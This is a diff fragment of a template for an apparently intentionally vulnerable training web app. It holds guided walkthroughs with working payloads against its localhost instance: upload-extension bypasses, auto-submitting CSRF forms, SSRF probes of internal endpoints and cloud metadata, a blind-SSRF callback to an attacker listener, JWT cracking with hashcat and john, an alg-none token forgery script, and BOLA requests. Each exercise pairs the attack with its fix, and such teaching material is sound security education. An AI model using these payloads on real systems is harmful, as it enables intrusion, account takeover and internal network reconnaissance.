+                <p>Go to <a href="/support/create" target="_blank">Create a Support Ticket</a> and find the attachment upload.</p>`,
+
+                `<p class="wt-mentor-text">Try uploading a <code>.php</code> file. Rejected. <code>.exe</code>? Rejected. But is the blocklist complete? What about <code>.phtml</code>, <code>.php5</code>, <code>.phar</code>?</p>`,
+
+                `<p class="wt-mentor-text">Try these alternative extensions that are often still executable:</p>
+                <pre>shell.phtml
+shell.php5
+shell.phar
+shell.py
+shell.rb
+shell.shtml</pre>
+                <p>The blocklist only covers <code>.php</code>, <code>.exe</code>, <code>.sh</code>, <code>.bat</code>, <code>.cmd</code>.</p>`,
+
+                `<p class="wt-mentor-text">Files with <code>.phtml</code>, <code>.phar</code>, or <code>.py</code> extensions upload successfully. On a real server, these might still be executed by the web server.</p>`,
+
+                `<p class="wt-mentor-text">Blocklists (denylists) are inherently incomplete. There are always edge cases and alternative extensions. The secure approach is an allowlist: only permit specific safe extensions like <code>.txt</code>, <code>.pdf</code>, <code>.jpg</code>, <code>.png</code>. Reject everything else.</p>`,
+
+                `<div class="wt-try-box">
+                    <a href="/support/create" target="_blank" class="btn btn-outline-info btn-lg"><i class="bi bi-paperclip"></i> Go to Support Ticket</a>
+                </div>`
+            ]
+        }
+    ]
+},
+{
+    id: "csrf",
+    name: "Cross-Site Request Forgery",
+    icon: "bi-shield-exclamation",
+    badgeClass: "vuln-csrf",
+    description: "Make authenticated users perform actions without their knowledge.",
+    vulns: [
+        {
+            id: "csrf-profile",
+            name: "CSRF on Profile Edit",
+            difficulty: "Medium",
+            steps: [
+                `<p class="wt-mentor-text">CSRF tricks a logged-in user into submitting a request they did not intend. If the app does not verify the request origin, it is vulnerable.</p>
+                <p>Go to <a href="/profile/edit" target="_blank">Profile Edit</a> and inspect the form.</p>`,
+
+                `<p class="wt-mentor-text">Look for a CSRF token in the form. Is there a hidden field with a random token? If not, the form has no CSRF protection. Any website can submit this form on behalf of a logged-in user.</p>`,
+
+                `<p class="wt-mentor-text">Create an HTML file on your machine with an auto-submitting form:</p>
+                <pre>&lt;html&gt;
+&lt;body onload="document.forms[0].submit()"&gt;
+  &lt;form method="POST" action="http://localhost:5000/profile/edit"&gt;
+    &lt;input name="user_id" value="1"&gt;
+    &lt;input name="bio" value="Hacked via CSRF"&gt;
+    &lt;input name="email" value="hacker@evil.com"&gt;
+  &lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre>
+                <p>Open this file in a browser while logged into Thyhe.</p>`,
+
+                `<p class="wt-mentor-text">The profile gets updated without the user's knowledge. The browser automatically includes the session cookie, and since there is no CSRF token, the server cannot tell the difference between a legitimate request and a forged one.</p>`,
+
+                `<p class="wt-mentor-text">CSRF works because browsers automatically send cookies with every request to a domain, regardless of which website initiated the request. CSRF tokens are random values embedded in forms that the server validates on submission. Without them, any website can forge requests as the authenticated user.</p>`,
+
+                `<div class="wt-try-box">
+                    <a href="/profile/edit" target="_blank" class="btn btn-outline-info btn-lg"><i class="bi bi-pencil"></i> Inspect Profile Edit Form</a>
+                </div>`
+            ]
+        },
+        {
+            id: "csrf-ticket",
+            name: "CSRF on Ticket Creation",
+            difficulty: "Medium",
+            steps: [
+                `<p class="wt-mentor-text">Same concept, different form. Let's check if support ticket creation has CSRF protection.</p>
+                <p>Go to <a href="/support/create" target="_blank">Create a Support Ticket</a> and inspect the form for CSRF tokens.</p>`,
+
+                `<p class="wt-mentor-text">No CSRF token in the form. That means we can create tickets on behalf of other users.</p>`,
+
+                `<p class="wt-mentor-text">Create a CSRF page that auto-submits a ticket:</p>
+                <pre>&lt;html&gt;
+&lt;body onload="document.forms[0].submit()"&gt;
+  &lt;form method="POST" action="http://localhost:5000/support/create"&gt;
+    &lt;input name="title" value="I need help"&gt;
+    &lt;textarea name="content"&gt;This ticket was created via CSRF&lt;/textarea&gt;
+    &lt;input name="priority" value="high"&gt;
+  &lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre>`,
+
+                `<p class="wt-mentor-text">A ticket gets created under the victim's account. The victim never intended to create it.</p>`,
+
+                `<p class="wt-mentor-text">CSRF on ticket creation might seem low impact, but consider: what if the ticket content contains stored XSS? You could use CSRF to plant XSS that fires when an admin reads the ticket. This is an example of chaining vulnerabilities for higher impact.</p>`,
+
+                `<div class="wt-try-box">
+                    <a href="/support/create" target="_blank" class="btn btn-outline-info btn-lg"><i class="bi bi-plus-circle"></i> Inspect Ticket Form</a>
+                </div>`
+            ]
+        },
+        {
+            id: "csrf-settings-weak",
+            name: "CSRF with Weak Token (Settings)",
+            difficulty: "Hard",
+            steps: [
+                `<p class="wt-mentor-text">Having a CSRF token is good, but only if it is actually validated properly. Let's check settings.</p>
+                <p>Go to <a href="/settings" target="_blank">Settings</a> and inspect the form source.</p>`,
+
+                `<p class="wt-mentor-text">There IS a CSRF token in this form: <code>&lt;input type="hidden" name="csrf_token" value="not-validated-lol"&gt;</code>. But look at that value. And more importantly, does the server actually validate it?</p>`,
+
+                `<p class="wt-mentor-text">Try submitting the form with any random value for <code>csrf_token</code>. Try <code>anything</code>, try <code>1</code>, try <code>abc</code>. Does it still work?</p>
+                <p>The server only checks if the parameter exists, not if it matches a valid token.</p>
+                <pre>&lt;form method="POST" action="http://localhost:5000/settings"&gt;
+  &lt;input name="csrf_token" value="literally-anything"&gt;
+  &lt;input name="theme" value="hacked"&gt;
+&lt;/form&gt;</pre>`,
+
+                `<p class="wt-mentor-text">The form submits successfully with any token value. The "protection" is theater.</p>`,
+
+                `<p class="wt-mentor-text">The server checks <code>if csrf_token:</code> which only verifies the parameter is present, not that it matches a server-generated value. This is a surprisingly common mistake. A proper CSRF implementation generates a unique random token per session (or per request), embeds it in the form, and validates it matches on the server.</p>`,
+
+                `<div class="wt-try-box">
+                    <a href="/settings" target="_blank" class="btn btn-outline-info btn-lg"><i class="bi bi-gear"></i> Go to Settings</a>
+                </div>`
+            ]
+        }
+    ]
+},
+{
+    id: "ssrf",
+    name: "Server-Side Request Forgery",
+    icon: "bi-arrow-repeat",
+    badgeClass: "vuln-ssrf",
+    description: "Make the server send requests to internal services and resources.",
+    vulns: [
+        {
+            id: "ssrf-urlcheck",
+            name: "Full SSRF (URL Checker)",
+            difficulty: "Medium",
+            steps: [
+                `<p class="wt-mentor-text">SSRF makes the server fetch URLs on your behalf. This lets you access internal services that are not directly reachable from your machine.</p>
+                <p>Go to <a href="/tools/urlcheck" target="_blank">Tools > URL Checker</a>.</p>`,
+
+                `<p class="wt-mentor-text">This tool checks if a URL is reachable. It fetches the URL from the server side. What if you point it at internal resources like <code>http://127.0.0.1</code>?</p>`,
+
+                `<p class="wt-mentor-text">Try these URLs in the checker:</p>
+                <pre>http://127.0.0.1:5000/internal/admin</pre>
+                <pre>http://localhost:5000/internal/status</pre>
+                <pre>http://127.0.0.1:5000/admin</pre>
+                <p>The <code>/internal/*</code> endpoints are only meant to be accessible from the server itself.</p>`,
+
+                `<p class="wt-mentor-text">The URL checker shows the response from internal endpoints. <code>/internal/admin</code> might reveal admin secrets, internal API keys, or configuration data that should never be exposed to external users.</p>`,
+
+                `<p class="wt-mentor-text">The app uses <code>requests.get(url)</code> without restricting which URLs or IP ranges are allowed. The fix is to validate that the URL does not resolve to private IP ranges (127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16) and to block access to sensitive internal endpoints.</p>`,
+
+                `<div class="wt-try-box">
+                    <a href="/tools/urlcheck" target="_blank" class="btn btn-outline-info btn-lg"><i class="bi bi-link-45deg"></i> Go to URL Checker</a>
+                </div>
+                <p class="mt-3"><strong>Extra challenges:</strong></p>
+                <ul>
+                    <li>Can you reach cloud metadata? Try <code>http://169.254.169.254/latest/meta-data/</code></li>
+                    <li>Port scan: try different ports on 127.0.0.1 to discover internal services</li>
+                </ul>`
+            ]
+        },
+        {
+            id: "ssrf-webhook-blind",
+            name: "Blind SSRF (Webhook)",
+            difficulty: "Hard",
+            steps: [
+                `<p class="wt-mentor-text">Sometimes the SSRF does not show you the response. The server makes the request, but you do not see what came back. This is blind SSRF.</p>
+                <p>Go to <a href="/tools/webhook" target="_blank">Tools > Webhook</a>.</p>`,
+
+                `<p class="wt-mentor-text">The webhook tool sends a request but only tells you if it succeeded or failed. You do not see the response body. This limits what you can extract, but you can still confirm the server is making requests.</p>`,
+
+                `<p class="wt-mentor-text">Set up a listener on your machine:</p>
+                <pre>python3 -m http.server 9999</pre>
+                <p>Then point the webhook at your server:</p>
+                <pre>http://YOUR_IP:9999/test</pre>
+                <p>Check your listener for the incoming request. You can also test internal access:</p>
+                <pre>http://127.0.0.1:22</pre>
+                <p>Different response times reveal whether ports are open or closed.</p>`,
+
+                `<p class="wt-mentor-text">Your listener receives the request from the server. For internal port scanning, open ports respond quickly while closed ports hang or error. This lets you map internal infrastructure.</p>`,
+
+                `<p class="wt-mentor-text">Blind SSRF cannot directly exfiltrate data, but it can: confirm outbound connectivity, scan internal networks, identify running services by response timing, and interact with internal APIs that have side effects (like sending emails or triggering actions).</p>`,
+
+                `<div class="wt-try-box">
+                    <a href="/tools/webhook" target="_blank" class="btn btn-outline-info btn-lg"><i class="bi bi-broadcast"></i> Go to Webhook</a>
+                </div>`
+            ]
+        },
+        {
+            id: "ssrf-compare",
+            name: "Full SSRF (URL Compare)",
+            difficulty: "Medium",
+            steps: [
+                `<p class="wt-mentor-text">This tool gives you something the others do not: two SSRF requests in a single action. The URL compare tool fetches two URLs simultaneously and shows differences. That means two independent SSRF vectors in one form.</p>
+                <p>Go to <a href="/tools/compare" target="_blank">Tools > Compare</a>.</p>`,
+
+                `<p class="wt-mentor-text">Think about how to use two simultaneous requests strategically. With the URL checker (one URL), you could access one internal endpoint at a time. With compare, you can probe two things at once. One creative use: put a known endpoint in URL 1 as your baseline, and use URL 2 to scan different ports on localhost.</p>
+                <pre>URL 1: http://127.0.0.1:5000/ (known - the app itself)
+URL 2: http://127.0.0.1:22 (probe - is SSH running?)</pre>
+                <p>If URL 2 returns content, that port is open and has an HTTP service. If it errors or times out, you know the port is closed or running a non-HTTP protocol.</p>`,
+
+                `<p class="wt-mentor-text">Now use it to access internal endpoints:</p>
+                <pre>URL 1: http://127.0.0.1:5000/internal/admin
+URL 2: http://127.0.0.1:5000/internal/status</pre>
+                <p>Both responses display side-by-side. You get the internal admin secrets AND the server status in one request. Efficient reconnaissance.</p>`,
+
+                `<p class="wt-mentor-text">Both internal endpoint responses are fully visible. Compared to the blind SSRF (webhook) where you got no response content, the URL checker and compare tools are "full" SSRF - you see everything. Compared to the URL checker (one URL), the compare tool doubles your throughput.</p>`,
+
+                `<p class="wt-mentor-text">Build an SSRF checklist for any application: look for features that fetch URLs on the user's behalf. Common ones: URL previews (social media, messaging apps), webhooks (notification settings), URL validators/checkers, screenshot generators, PDF exporters ("export this page as PDF"), import-from-URL functions, and link unfurlers. Each one is a potential SSRF target. Test with <code>http://127.0.0.1</code> first - if the server makes the request, you have SSRF.</p>`,
+
+                `<div class="wt-try-box">
+                    <a href="/tools/compare" target="_blank" class="btn btn-outline-info btn-lg"><i class="bi bi-arrow-left-right"></i> Go to URL Compare</a>
+                </div>`
+            ]
+        }
+    ]
+},
+{
+    id: "jwt",
+    name: "JWT Attacks",
+    icon: "bi-file-earmark-lock",
+    badgeClass: "vuln-jwt",
+    description: "Crack, forge, and manipulate JSON Web Tokens to bypass API authentication.",
+    vulns: [
+        {
+            id: "jwt-weak-secret",
+            name: "JWT Weak Secret",
+            difficulty: "Medium",
+            steps: [
+                `<p class="wt-mentor-text">The API uses JWT tokens for authentication. If the signing secret is weak, we can crack it and forge our own tokens.</p>
+                <p>First, get a JWT. Log in via the API:</p>
+                <pre>curl -X POST http://localhost:5000/api/v1/login -H "Content-Type: application/json" -d '{"username":"agarcia","password":"Welcome1!"}'</pre>`,
+
+                `<p class="wt-mentor-text">Look at the token you received. Paste it into <code>jwt.io</code> to decode it. The header shows the algorithm (HS256) and the payload shows your user data. The signature is the part we need to crack.</p>`,
+
+                `<p class="wt-mentor-text">Save the token to a file and crack it with john or hashcat:</p>
+                <pre>echo "YOUR_JWT_TOKEN" > jwt.txt
+john jwt.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256</pre>
+                <p>Or with hashcat:</p>
+                <pre>hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt</pre>`,
+
+                `<p class="wt-mentor-text">The secret cracks almost instantly. It is just <code>secret</code>. With the secret known, you can forge tokens for any user, any role.</p>`,
+
+                `<p class="wt-mentor-text">JWTs signed with weak secrets are trivially crackable. The secret <code>secret</code> appears in every wordlist. Once cracked, the attacker can create tokens with any claims (admin role, any user ID). Use long random secrets (256+ bits) or asymmetric algorithms (RS256) for production JWTs.</p>`,
+
+                `<div class="wt-try-box">
+                    <p>Get a token first:</p>
+                    <pre>curl -X POST http://localhost:5000/api/v1/login -H "Content-Type: application/json" -d '{"username":"agarcia","password":"Welcome1!"}'</pre>
+                </div>`
+            ]
+        },
+        {
+            id: "jwt-alg-none",
+            name: "JWT Algorithm None Attack",
+            difficulty: "Hard",
+            steps: [
+                `<p class="wt-mentor-text">There is a classic JWT attack called "algorithm none." If the server accepts unsigned tokens, you can forge anything without knowing the secret.</p>
+                <p>Get a valid JWT first (see the previous walkthrough).</p>`,
+
+                `<p class="wt-mentor-text">Decode the JWT (it is three base64 parts separated by dots). The header is the first part. Change the <code>alg</code> field from <code>HS256</code> to <code>none</code>, modify the payload to have admin privileges, and strip the signature.</p>`,
+
+                `<p class="wt-mentor-text">Use Python to forge a token:</p>
+                <pre>import jwt
+token = jwt.encode(
+    {"user_id": 1, "username": "admin", "role": "admin"},
+    key="",
+    algorithm="none"
+)
+print(token)</pre>
+                <p>Or manually: base64-encode a header with <code>{"alg":"none","typ":"JWT"}</code>, a payload with admin claims, and use an empty signature (just the trailing dot).</p>
+                <p>Then use the forged token:</p>
+                <pre>curl http://localhost:5000/api/v1/admin/users -H "Authorization: Bearer YOUR_FORGED_TOKEN"</pre>`,
+
+                `<p class="wt-mentor-text">The API accepts your unsigned token and treats you as admin. You can access all admin API endpoints without any valid credentials.</p>`,
+
+                `<p class="wt-mentor-text">The <code>alg: none</code> attack works because the server verifies the token using whichever algorithm the token says to use. If it says "none," no signature check happens. The fix is to explicitly specify allowed algorithms when verifying: <code>jwt.decode(token, secret, algorithms=["HS256"])</code>, never accepting "none."</p>`,
+
+                `<div class="wt-try-box">
+                    <p>Test with the forged token:</p>
+                    <pre>curl http://localhost:5000/api/v1/admin/users -H "Authorization: Bearer FORGED_TOKEN"</pre>
+                </div>`
+            ]
+        },
+        {
+            id: "jwt-bola",
+            name: "BOLA via API (JWT IDOR)",
+            difficulty: "Medium",
+            steps: [
+                `<p class="wt-mentor-text">Even with a valid JWT, the API might not check if you are authorized to access the specific resource you are requesting.</p>
+                <p>Get a JWT for a regular user (agarcia).</p>`,
+
+                `<p class="wt-mentor-text">The API has endpoints like <code>/api/v1/users/1</code> and <code>/api/v1/users/1/update</code>. Your token says you are user 3 (agarcia). What if you request user 1 (admin)?</p>`,
+
+                `<p class="wt-mentor-text">Use your regular-user token to access and modify other users:</p>
+                <pre>curl http://localhost:5000/api/v1/users/1 -H "Authorization: Bearer YOUR_TOKEN"</pre>
+                <pre>curl -X PUT http://localhost:5000/api/v1/users/1/update -H "Authorization: Bearer YOUR_TOKEN" -H "Content-Type: application/json" -d '{"role":"user"}'</pre>`,
+
+                `<p class="wt-mentor-text">You can read and modify any user's data using your low-privilege token. The API only checks that you have a valid token, not that you own the resource.</p>`,
+
+                `<p class="wt-mentor-text">This is BOLA (Broken Object Level Authorization), the API equivalent of IDOR. The token authenticates who you are, but the endpoint does not check if user 3 should be allowed to modify user 1's data. Always check that the JWT user ID matches the resource being accessed.</p>`,
+
+                `<div class="wt-try-box">
+                    <p>Get a token and test:</p>
+                    <pre>curl -X POST http://localhost:5000/api/v1/login -H "Content-Type: application/json" -d '{"username":"agarcia","password":"Welcome1!"}'</pre>
+                </div>`
+            ]
+        }
+    ]
+}
+]
+};
+
+let currentCategory = null;
+let currentVuln = null;
+let currentStep = 0;
+const STORAGE_KEY = 'thyhe-walkthrough-completed';
+
+function getCompleted() {
+    try { return JSON.parse(localStorage.getItem(STORAGE_KEY) || '[]'); }
+    catch(e) { return []; }
+}
+function setCompleted(vulnId) {
+    const c = getCompleted();
+    if (!c.includes(vulnId)) { c.push(vulnId); localStorage.setItem(STORAGE_KEY, JSON.stringify(c)); }
+}
+function isCompleted(vulnId) { return getCompleted().includes(vulnId); }
+
+function getTotalVulns() {
+    let t = 0;
+    WALKTHROUGH_DATA.categories.forEach(c => t += c.vulns.length);
+    return t;
+}
+
+function updateOverall() {
+    const completed = getCompleted();
+    const total = getTotalVulns();
+    let done = 0;
+    WALKTHROUGH_DATA.categories.forEach(cat => {
+        cat.vulns.forEach(v => { if (completed.includes(v.id)) done++; });
+    });
+    document.getElementById('overall-progress').textContent = done + '/' + total;
+    document.getElementById('overall-progress-bar').style.width = (total ? (done/total*100) : 0) + '%';
+}
+
+function showCategories() {
+    document.getElementById('view-categories').style.display = '';
+    document.getElementById('view-vulns').style.display = 'none';
+    document.getElementById('view-wizard').style.display = 'none';
+    document.getElementById('breadcrumb-list').innerHTML = '<li class="breadcrumb-item active">Categories</li>';
+    currentCategory = null;
+    currentVuln = null;
+
+    const grid = document.getElementById('category-grid');
+    const completed = getCompleted();
+    grid.innerHTML = '';
+    WALKTHROUGH_DATA.categories.forEach(cat => {
+        const done = cat.vulns.filter(v => completed.includes(v.id)).length;
+        const autoCount = cat.vulns.filter(v => v.steps.length >= 7).length;
+        const pct = cat.vulns.length ? (done / cat.vulns.length * 100) : 0;
+        const col = document.createElement('div');
+        col.className = 'col-md-4 col-lg-3';
+        col.innerHTML = `
+            <div class="wt-category-card" onclick="showVulns('${cat.id}')">
+                <div class="category-icon ${cat.badgeClass}"><i class="bi ${cat.icon}"></i></div>
+                <h5 class="mt-2 mb-1">${cat.name}</h5>
+                <div class="category-count">${cat.vulns.length} vulnerabilities</div>
+                <div class="wt-progress"><div class="wt-progress-bar" style="width:${pct}%"></div></div>
+                <div class="category-count mt-1">${done}/${cat.vulns.length} completed</div>
+                ${autoCount ? `<span class="wt-auto-badge"><i class="bi bi-robot"></i> ${autoCount} automatable</span>` : ''}
+            </div>`;
+        grid.appendChild(col);
+    });
+    updateOverall();
+}
+
+function showVulns(catId) {
+    const cat = WALKTHROUGH_DATA.categories.find(c => c.id === catId);
+    if (!cat) return;
+    currentCategory = cat;
+    document.getElementById('view-categories').style.display = 'none';
+    document.getElementById('view-vulns').style.display = '';
+    document.getElementById('view-wizard').style.display = 'none';
+    document.getElementById('breadcrumb-list').innerHTML = `
+        <li class="breadcrumb-item"><a href="#" onclick="showCategories();return false;">Categories</a></li>
+        <li class="breadcrumb-item active">${cat.name}</li>`;
+    document.getElementById('vuln-list-intro').textContent = cat.description;
+
+    const list = document.getElementById('vuln-list');
+    const completed = getCompleted();
+    list.innerHTML = '';
+    cat.vulns.forEach(v => {
+        const done = completed.includes(v.id);
+        const hasAuto = v.steps.length >= 7;
+        const div = document.createElement('div');
+        div.className = 'wt-vuln-item' + (done ? ' completed' : '');
+        div.onclick = () => showWizard(v.id);
+        div.innerHTML = `
+            <div>
+                <span class="wt-difficulty wt-difficulty-${v.difficulty.toLowerCase()}">${v.difficulty}</span>
+                <strong class="ms-2">${v.name}</strong>
+                ${hasAuto ? '<span class="wt-auto-badge ms-2"><i class="bi bi-robot"></i> Automate</span>' : ''}
+            </div>
+            <div>
+                ${done ? '<i class="bi bi-check-circle-fill text-success me-2"></i>' : ''}
+                <i class="bi bi-chevron-right text-muted"></i>
+            </div>`;
+        list.appendChild(div);
+    });
+}
+
+function showWizard(vulnId) {
+    let vuln = null, cat = null;
+    for (const c of WALKTHROUGH_DATA.categories) {
+        const v = c.vulns.find(x => x.id === vulnId);
+        if (v) { vuln = v; cat = c; break; }
+    }
+    if (!vuln) return;
+    currentCategory = cat;
+    currentVuln = vuln;
+    currentStep = 0;
+
+    document.getElementById('view-categories').style.display = 'none';
+    document.getElementById('view-vulns').style.display = 'none';
+    document.getElementById('view-wizard').style.display = '';
+    document.getElementById('breadcrumb-list').innerHTML = `
+        <li class="breadcrumb-item"><a href="#" onclick="showCategories();return false;">Categories</a></li>
+        <li class="breadcrumb-item"><a href="#" onclick="showVulns('${cat.id}');return false;">${cat.name}</a></li>
+        <li class="breadcrumb-item active">${vuln.name}</li>`;
+    renderStep();
+}
+
+function renderStep() {
+    const indicator = document.getElementById('step-indicator');
+    let html = '';
+    const totalSteps = currentVuln.steps.length;
+    const hasAuto = totalSteps >= 7;
+    for (let i = 0; i < totalSteps; i++) {
+        const isAutoStep = hasAuto && i === totalSteps - 1;
+        if (i > 0) html += `<div class="wt-step-line ${i <= currentStep ? 'visited' : ''}"></div>`;
+        const cls = (i === currentStep ? 'active' : (i < currentStep ? 'visited' : '')) + (isAutoStep ? ' auto-step' : '');
+        const label = isAutoStep ? '<i class="bi bi-robot"></i>' : (i+1);
+        html += `<div class="wt-step-dot ${cls}" onclick="goToStep(${i})" title="${STEP_ICONS[i].title}">${label}</div>`;
+    }
+    indicator.innerHTML = html;
+
+    const step = STEP_ICONS[currentStep];
+    document.getElementById('step-content').innerHTML = `
+        <h4><i class="bi ${step.icon}"></i> Step ${currentStep+1}: ${step.title}</h4>
+        ${currentVuln.steps[currentStep]}`;
+
+    const lastStep = currentVuln.steps.length - 1;
+    document.getElementById('btn-prev').style.display = currentStep === 0 ? 'none' : '';
+    document.getElementById('btn-next').style.display = currentStep === lastStep ? 'none' : '';
+    document.getElementById('btn-complete').style.display = currentStep === lastStep ? '' : 'none';
+
+    if (isCompleted(currentVuln.id)) {
+        document.getElementById('btn-complete').innerHTML = '<i class="bi bi-check-circle-fill"></i> Completed!';
+        document.getElementById('btn-complete').className = 'btn btn-outline-success';
+        document.getElementById('btn-complete').disabled = true;
+    } else {
+        document.getElementById('btn-complete').innerHTML = '<i class="bi bi-check-circle"></i> Mark Complete';
+        document.getElementById('btn-complete').className = 'btn btn-success';
+        document.getElementById('btn-complete').disabled = false;
+    }
+}
+
+function goToStep(n) { currentStep = n; renderStep(); }
+function nextStep() { if (currentStep < currentVuln.steps.length - 1) { currentStep++; renderStep(); } }
+function prevStep() { if (currentStep > 0) { currentStep--; renderStep(); } }
+
+function markComplete() {
+    if (!currentVuln) return;
+    setCompleted(currentVuln.id);
+    renderStep();
+    updateOverall();
+}
+
+function resetProgress() {
+    if (confirm('Reset all walkthrough progress? This cannot be undone.')) {
+        localStorage.removeItem(STORAGE_KEY);
+        showCategories();
+    }
+}
+
+showCategories();
+</script>
+{% endraw %}
+{% endblock %}
